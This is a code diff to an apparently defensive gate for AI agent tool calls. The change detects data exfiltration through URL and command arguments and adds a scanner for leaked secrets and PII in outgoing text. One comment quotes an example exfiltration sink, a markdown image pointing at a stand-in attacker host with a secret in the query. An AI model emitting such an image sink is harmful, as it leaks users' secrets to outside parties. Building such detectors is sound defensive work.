@@ -49,20 +49,38 @@ export interface GateResult {
   reason: string;
 }
 
+// Candidate arg keys that carry an outbound URL or a shell command. We probe
+// these on EVERY tool regardless of its (possibly aliased/cased/MCP) name, so
+// the URL-exfil and sensitive-file-exfil detectors are reachable for tools the
+// old exact-name dispatch missed (webfetch, http_request, curl, mcp__*, ...).
+const _URL_KEYS = ["url", "uri", "href", "link", "endpoint", "address"];
+const _CMD_KEYS = ["command", "cmd", "script", "code", "run", "shell"];
+
+function _firstString(input: Record<string, unknown>, keys: string[]): string {
+  for (const k of keys) {
+    const v = input[k];
+    if (typeof v === "string" && v) return v;
+  }
+  return "";
+}
+
 // before_tool_call: gate an outbound/exec tool whose args look like data
 // exfiltration (secret-bearing URL, sensitive-file read piped to network, ...).
+// Dispatch does NOT depend on the tool name: we always send the args as `text`
+// (so secret signatures anywhere are caught) and additionally surface any
+// url-like / command-like field so the url/command-specific detectors fire.
 export async function gateToolCall(
   toolName: string,
   input: Record<string, unknown>,
 ): Promise<GateResult> {
-  let ev;
-  if (toolName === "WebFetch" || toolName === "fetch" || toolName === "http") {
-    ev = await egress({ url: String(input.url ?? "") });
-  } else if (toolName === "Bash" || toolName === "shell" || toolName === "exec") {
-    ev = await egress({ command: String(input.command ?? input.cmd ?? "") });
-  } else {
-    ev = await egress({ text: JSON.stringify(input ?? {}) });
-  }
+  const inp = (input ?? {}) as Record<string, unknown>;
+  void toolName; // dispatch is field-driven, not name-driven (see _URL_KEYS/_CMD_KEYS)
+  const url = _firstString(inp, _URL_KEYS);
+  const command = _firstString(inp, _CMD_KEYS);
+  const args: { text: string; url?: string; command?: string } = { text: JSON.stringify(inp) };
+  if (url) args.url = url;
+  if (command) args.command = command;
+  const ev = await egress(args);
   if (ev.decision === "allow") return { action: "allow", reason: "" };
   const detail = ev.findings.slice(0, 4).map((f) => `${f.label} (${f.snippet})`).join("; ");
   const block = (process.env.AIRLOCK_EGRESS_BLOCK ?? "0") !== "0";
@@ -72,6 +90,17 @@ export async function gateToolCall(
   };
 }
 
+// Detect high-confidence leaks (secrets / PII) in arbitrary outbound text — e.g.
+// the metadata half of an outgoing message. Used for defense-in-depth where
+// rewriting in place would be unsafe (host routing data), so a confirmed leak
+// fails *safe* (withhold) rather than being silently rewritten.
+export async function scanForLeaks(text: string): Promise<{ leak: boolean; labels: string[] }> {
+  if (!text) return { leak: false, labels: [] };
+  const ev = await egress({ text });
+  const hits = ev.findings.filter((f) => f.kind === "secret" || f.kind === "pii");
+  return { leak: hits.length > 0, labels: [...new Set(hits.map((f) => f.label))] };
+}
+
 export interface ReplyResult {
   text: string;
   changed: boolean;
@@ -79,7 +108,7 @@ export interface ReplyResult {
   reason: string;
 }
 
-// before_agent_reply: rewrite the outgoing reply to neutralize exfiltration
+// message_sending: rewrite the outgoing reply to neutralize exfiltration
 // sinks (![](http://attacker/?data=SECRET) auto-fetch images) AND redact leaked
 // secrets/PII. The core's sanitized_text only strips sink URLs, so secret-only
 // replies have sanitized_text === text — we must drive the decision off
